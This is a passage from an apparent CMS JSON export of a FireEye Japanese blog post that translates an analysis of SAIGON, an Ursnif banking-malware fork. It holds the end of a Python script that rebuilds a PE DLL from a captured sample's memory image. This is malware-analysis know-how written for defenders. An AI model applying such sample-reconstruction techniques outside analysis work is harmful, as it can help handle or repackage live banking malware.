1\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; struct.pack_into(\u0027=8sIIIIIIHHI\u0027, data, 0x18 + optional_header_size + 0x28 * section,\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; b\u0027.rdata\u0027,\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; data_size, base_of_data,\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; data_size, size_of_header + base_of_data - base_of_code,\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; 0, 0,\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; 0, 0,\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; 0x40000040\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; )\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; section += 1\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; struct.pack_into(\u0027=8sIIIIIIHHI\u0027, data, 0x18 + optional_header_size + 0x28 * section,\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; b\u0027.data\u0027,\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; 0x1000, base_of_data + data_size,\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; 0x1000, size_of_header + base_of_data - base_of_code + data_size,\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; 0, 0,\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; 0, 0,\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; 0xc0000040\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; )\u003C\/p\u003E\n\u003Cp\u003E\u0026nbsp;\u0026nbsp;\u0026nbsp; if magic == 0x20b:\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; section += 1\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; struct.pack_into(\u0027=8sIIIIIIHHI\u0027, data, 0x18 + optional_header_size + 0x28 * section,\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; b\u0027.pdata\u0027,\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; 0x1000, base_of_data + data_size + 0x1000,\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; 0x1000, size_of_header + base_of_data - base_of_code + data_size + 0x1000,\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; 0, 0,\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; 0, 0,\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; 0x40000040\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; )\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; section += 1\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; struct.pack_into(\u0027=8sIIIIIIHHI\u0027, data, 0x18 + optional_header_size + 0x28 * section,\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; b\u0027.bss\u0027,\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; 0x1600, base_of_data + data_size + 0x2000,\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; len(data[base_of_data + data_size + 0x2000:]), size_of_header + base_of_data - base_of_code + data_size + 0x2000,\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; 0, 0,\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; 0, 0,\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; 0xc0000040\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; )\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; else:\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; section += 1\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; struct.pack_into(\u0027=8sIIIIIIHHI\u0027, data, 0x18 + optional_header_size + 0x28 * section,\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; b\u0027.bss\u0027,\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; 0x1000, base_of_data + data_size + 0x1000,\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; 0x1000, size_of_header + base_of_data - base_of_code + data_size + 0x1000,\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; 0, 0,\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; 0, 0,\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; 0xc0000040\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; )\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; section += 1\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; struct.pack_into(\u0027=8sIIIIIIHHI\u0027, data, 0x18 + optional_header_size + 0x28 * section,\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; b\u0027.reloc\u0027,\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; 0x2000, base_of_data + data_size + 0x2000,\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; len(data[base_of_data + data_size + 0x2000:]), size_of_header + base_of_data - base_of_code + data_size + 0x2000,\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; 0, 0,\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; 0, 0,\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; 0x40000040\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; )\u003C\/p\u003E\n\u003Cp\u003E\u0026nbsp;\u0026nbsp;\u0026nbsp; header = MZ_HEADER + data[:size_of_header - len(MZ_HEADER)]\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; pe = bytearray(header + data[0x1000:])\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; with open(args.sample + \u0027.dll\u0027, \u0027wb\u0027) as f:\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; f.write(pe)\u003C\/p\u003E\n\u003Cp\u003E\u0026nbsp;\u0026nbsp;\u0026nbsp; lfanew = struct.unpack_from(\u0027=I\u0027, pe, 0x3c)[0]\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; timestamp = struct.unpack_from(\u0027=I\u0027, pe, lfanew + 8)[0]\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; print(\u0027PE timestamp:\u0027, datetime.utcfromtimestamp(timestamp).isoformat())\u003C\/p\u003E\n\u003Cp\u003E\u0026nbsp;\u003C\/p\u003E\n\u003Cp\u003Eif __name__ == \u0026quot;__main__\u0026quot;:\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; main()\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003C\/tbody\u003E\u003C\/table\u003E\n\u003Cp\u003E\u0026nbsp;\u003C\/p\u003E\n\u003Cp\u003E\u672c\u30d6\u30ed\u30b0\u306f\u3001\u7c73FireEye\u304c\u516c\u958b\u3057\u305f\u300c\u003Ca href=\u0022https:\/\/www.fireeye.com\/blog\/threat-research\/2020\/01\/saigon-mysterious-ursnif-fork.html\u0022 target=\u0022_blank\u0022 adhocenable=\u0022false\u0022\u003ESAIGON, the Mysterious Ursnif Fork\u003C\/a\u003E\u300d\uff08\u82f1\u8a9e\uff09\u306e\u65e5\u672c\u8a9e\u6284\u8a33\u7248\u3067\u3059\u3002\u003C\/p\u003E\n\u003Cp\u003E\u65e5\u672c\u8a9e\u7248\uff1aReviewed by Ayako Matsuda\u003C\/p\u003E\n",
        "jcr:lastModified": "Fri Jan 24 2020 08:52:19 GMT+0000",
        "sling:resourceType": "social\/blog\/components\/entrytext"
      }
    },
    "summary": {
      "jcr:primaryType": "nt:unstructured",
      "jcr:lastModifiedBy": "asami.wakasugi@fireeye.com",
      "text": "\u003Cp\u003ESAIGON\uff1aUrsnif\u306e\u4e9c\u7a2ev3\uff08RM3\uff09\u306e\u30bd\u30fc\u30b9\u30b3\u30fc\u30c9\u3092\u30d9\u30fc\u30b9\u306b\u3057\u3066\u3044\u308b\u53ef\u80fd\u6027\u304c\u9ad8\u3044\u30d0\u30f3\u30ad\u30f3\u30b0\u30fb\u30de\u30eb\u30a6\u30a7\u30a2\u3092\u89e3\u8aac\u003Cbr\u003E\n\u003C\/p\u003E\n",
      "jcr:lastModified": "Fri Jan 24 2020 08:52:46 GMT+0000",
      "sling:resourceType": "social\/blog\/components\/entrytextteaser"
    },
    "image": {
      "jcr:primaryType": "nt:unstructured",
      "fileReference": "\/content\/dam\/fireeye-www\/blog\/images\/saigon\/Picture1.png",
      "jcr:lastModifiedBy": "asami.wakasugi@fireeye.com",
      "jcr:lastModified": "Fri Jan 24 2020 08:38:02 GMT+0000",
      "imageRotate": "0"
    }
  }
}
